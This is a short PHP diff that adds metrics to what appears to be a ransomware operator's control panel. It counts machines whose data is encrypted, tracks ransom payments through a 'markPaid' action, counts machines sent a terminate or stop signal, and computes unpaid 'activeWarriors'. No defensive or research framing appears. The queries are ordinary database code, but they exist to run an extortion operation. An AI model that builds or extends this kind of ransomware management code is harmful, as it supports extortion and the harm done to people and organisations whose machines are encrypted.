@@ -47,6 +47,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['markPaid'])) {
 if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['terminate'])) {
 
     $machineId = $_POST['machineId'];
+
     /** @noinspection ALL */
     $terminateStmt = $pdo->prepare("UPDATE machine_keys SET status = 'terminated' WHERE id = ? AND stop_signal = 1");
 
@@ -55,3 +56,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['terminate'])) {
         exit;
     }
 }
+
+// Step 6: Fetch Data for Dashboard Metrics
+/** @noinspection ALL */
+$totalEncryptedStmt = $pdo->query("SELECT COUNT(DISTINCT machine_id) AS total_encrypted FROM machine_keys");
+
+$totalEncrypted = $totalEncryptedStmt->fetch(PDO::FETCH_ASSOC)['total_encrypted'];
+
+/** @noinspection ALL */
+$machinePaidStmt = $pdo->query("SELECT COUNT(*) AS machine_paid FROM machine_keys WHERE status = 'paid'");
+
+$machinePaid = $machinePaidStmt->fetch(PDO::FETCH_ASSOC)['machine_paid'];
+
+/** @noinspection ALL */
+$machineTerminatedStmt = $pdo->query("SELECT COUNT(*) AS machine_terminated FROM machine_keys WHERE stop_signal = 1");
+
+$machineTerminated = $machineTerminatedStmt->fetch(PDO::FETCH_ASSOC)['machine_terminated'];
+
+$activeWarriors = $totalEncrypted - $machinePaid;
